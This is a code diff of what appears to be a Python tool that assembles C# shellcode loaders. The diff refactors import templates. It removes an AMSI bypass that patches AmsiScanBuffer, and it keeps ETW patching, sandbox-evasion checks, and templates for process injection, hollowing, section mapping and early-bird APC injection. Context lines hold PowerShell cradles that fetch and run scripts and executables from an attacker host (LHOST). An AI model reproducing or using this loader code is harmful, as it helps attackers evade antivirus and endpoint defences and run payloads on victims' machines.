@@ -32,39 +32,11 @@ PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/r
 PS_UNZIP_CMD = "wget http://{LHOST}/{tool} -o C:\\\\windows\\\\tasks\\\\t.zip;Expand-archive -LiteralPath C:\\\\windows\\\\tasks\\\\t.zip -DestinationPath C:\\\\windows\\\\tasks\\\\"
 PS_EXE_DL = "wget http://{LHOST}/{tool} -o t.exe;.\\t.exe {cmd}"
 
-AMSI_BYPASS_IMPORT = f"""
-  // [DllImport("kernel32")]
-  // public static extern IntPtr LoadLibrary(string name);
-  // [DllImport("kernel32")]
-  // public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-  // [DllImport("kernel32")]
-  // public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-  {PINVOKE["MoveMemory"]}
-"""
+ETW_PINVOKE_IMPORT = ["GetProcAddress",
+                      "LoadLibrary",
+                      "VirtualProtect"]
 
-AMSI_BYPASS_CODE = """
-        var lib = LoadLibrary("amsi.dll");
-        var asb = GetProcAddress(lib, "AmsiScanBuffer");
-        var patch = Convert.FromBase64String("uFcAB4DD");
-
-        if (!is64Bit())
-            patch = Convert.FromBase64String("uFcAB4DCGAA=");
-
-      try{
-        _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
-        Marshal.Copy(patch, 0, asb, patch.Length);
-      } catch {
-        //silent continue
-      }
-        VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);
-"""
-
-ETW_FUNCS = f"""
-  {PINVOKE["GetProcAddress"]}
-  {PINVOKE["LoadLibrary"]}
-  {PINVOKE["VirtualProtect"]}
-"""
-ETW_FUNCS += """
+ETW_CODE_IMPORT = """
 private static byte[] getETWPayload()
     {
         if (!is64Bit())
@@ -100,12 +72,10 @@ ARCH_DETECTION = """
         }
 """
 
-HEURISTICS_IMPORT = f"""
-  {PINVOKE["Sleep"]}
-  {PINVOKE["VirtualAllocExNuma"]}
-  {PINVOKE["GetCurrentProcess"]}
-  {PINVOKE["FlsAlloc"]}
-"""
+HEURISTICS_PINVOKE_IMPORT = ["Sleep",
+                             "VirtualAllocExNuma",
+                             "GetCurrentProcess",
+                             "FlsAlloc"]
 
 HEURISTICS_CODE = """
     DateTime t1 = DateTime.Now;
@@ -162,7 +132,7 @@ SC_AES_DECODER = """
   shellcode = DecryptInPlace(shellcode, AESKey, AESIV);
 """
 
-ETW_PATCH = "PatchEtw(getETWPayload());"
+ETW_MAIN_CODE = "PatchEtw(getETWPayload());"
 
 RC4_DECRYPT_IMPORT = """
 public class RC4
@@ -242,20 +212,17 @@ private static byte[] DecryptInPlace(byte[] ciphertext, string AESKey, string AE
 }
 """
 
-START_PROCESS_INJECT_IMPORT = f"""
-    {PINVOKE["VirtualAllocEx"]} 
-    {PINVOKE["OpenProcess"]} 
-    {PINVOKE["WriteProcessMemory"]} 
-    {PINVOKE["CreateRemoteThread"]} 
-    {PINVOKE["ShowWindow"]}
-"""
+START_PROCESS_INJECT_PINVOKE_IMPORT = ["VirtualAllocEx",
+                                      "OpenProcess",
+                                      "WriteProcessMemory",
+                                      "CreateRemoteThread",
+                                      "ShowWindow",]
 
-START_SHELLCODE_IMPORT = f"""
-         {PINVOKE["VirtualAlloc"]}
-         {PINVOKE["CreateThread"]}
-         {PINVOKE["WaitForSingleObject"]}
-"""
-START_SHELLCODE = """
+START_SHELLCODE_PINVOKE_IMPORT = ["VirtualAlloc",
+                                 "CreateThread",
+                                 "WaitForSingleObject",]
+
+START_SHELLCODE_CODE_IMPORT = """
             UInt32 MEM_COMMIT = 0x3000;
             UInt32 PAGE_EXECUTE_READWRITE = 0x40;
             UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -295,14 +262,13 @@ START_PROCESS_INJECT = """
           }
 """
 
-START_PROCESS_HOLLOW_IMPORT =  f"""
-         {PINVOKE["CreateProcess"]}
-         {PINVOKE["ZwQueryInformationProcess"]}
-         {PINVOKE["ReadProcessMemory"]}
-         {PINVOKE["WriteProcessMemory"]}
-         {PINVOKE["ResumeThread"]}
-"""
-START_PROCESS_HOLLOW_IMPORT += """
+START_PROCESS_HOLLOW_PINVOKE_IMPORT =  ["CreateProcess",
+                                       "ZwQueryInformationProcess",
+                                       "ReadProcessMemory",
+                                       "WriteProcessMemory",
+                                       "ResumeThread",]
+
+START_PROCESS_HOLLOW_CODE_IMPORT = """
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         struct STARTUPINFO
         {
@@ -383,15 +349,14 @@ START_PROCESS_HOLLOW_CODE = """
       ResumeThread(pi.hThread);
 """
 
-START_PROCESS_INTERPROCESS_IMPORT = f"""
-  {PINVOKE["NtUnmapViewOfSection"]}
-  {PINVOKE["NtClose"]}
-  {PINVOKE["NtCreateSection"]}
-  {PINVOKE["NtMapViewOfSection"]}
-  {PINVOKE["RtlCreateUserThread"]}
-  {PINVOKE["ShowWindow"]}
-""" 
-START_PROCESS_INTERPROCESS_IMPORT += """
+START_PROCESS_INTERPROCESS_PINVOKE_IMPORT = ["NtUnmapViewOfSection",
+                                            "NtClose",
+                                            "NtCreateSection",
+                                            "NtMapViewOfSection",
+                                            "RtlCreateUserThread",
+                                            "ShowWindow"]
+
+START_PROCESS_INTERPROCESS_CODE_IMPORT = """
 
         [Flags]
 	public enum SectionAccess : UInt32
@@ -471,19 +436,18 @@ START_PROCESS_INTERPROCESS_CODE = """
 """
 
 
-START_PROCESS_EARLYBIRD_IMPORT = f"""
-         {PINVOKE["VirtualAllocEx2"]}
-         {PINVOKE["OpenProcess"]}
-         {PINVOKE["CreateRemoteThread2"]}
-         {PINVOKE["QueueUserAPC"]}
-         {PINVOKE["ResumeThread"]}
-         {PINVOKE["CloseHandle"]}
-         {PINVOKE["NtWriteVirtualMemory"]}
-         {PINVOKE["RtlZeroMemory"]}
-         {PINVOKE["WaitForSingleObject"]}
-         {PINVOKE["ShowWindow"]}
-"""
-START_PROCESS_EARLYBIRD_IMPORT += """
+START_PROCESS_EARLYBIRD_PINVOKE_IMPORT = ["VirtualAllocEx2",
+                                         "OpenProcess",
+                                         "CreateRemoteThread2",
+                                         "QueueUserAPC",
+                                         "ResumeThread",
+                                         "CloseHandle",
+                                         "NtWriteVirtualMemory",
+                                         "RtlZeroMemory",
+                                         "WaitForSingleObject",
+                                         "ShowWindow",]
+
+START_PROCESS_EARLYBIRD_CODE_IMPORT = """
                 [Flags]
         public enum NTSTATUS : uint
         {
@@ -596,11 +560,18 @@ START_PROCESS_EARLYBIRD_CODE = """
             }
 """
 
-import_choices = {
-  'hollow':f"{START_PROCESS_HOLLOW_IMPORT}",
-  'interprocess':f"{START_PROCESS_INTERPROCESS_IMPORT}",
-  'earlybird':f"{START_PROCESS_EARLYBIRD_IMPORT}",
-  'standard':f"{START_SHELLCODE_IMPORT}"
+import_choices_pinvoke_import = {
+  'hollow':START_PROCESS_HOLLOW_PINVOKE_IMPORT,
+  'interprocess':START_PROCESS_INTERPROCESS_PINVOKE_IMPORT,
+  'earlybird':START_PROCESS_EARLYBIRD_PINVOKE_IMPORT,
+  'standard':START_SHELLCODE_PINVOKE_IMPORT,
+}
+
+import_choices_code_import = {
+  'hollow':f"{START_PROCESS_HOLLOW_CODE_IMPORT}",
+  'interprocess':f"{START_PROCESS_INTERPROCESS_CODE_IMPORT}",
+  'earlybird':f"{START_PROCESS_EARLYBIRD_CODE_IMPORT}",
+  'standard':f"{START_SHELLCODE_CODE_IMPORT}"
 }
 
 main_choices = {
@@ -618,6 +589,8 @@ main_choices = {
   'standard':"{ak.START_SHELLCODE}",
 }
 
+def get_pinvoke_import(pinvoke):
+  return f"{PINVOKE[pinvoke]}"
 
 class Obfuscator:
   def __init__(self, string, xor_key=b'\00'):
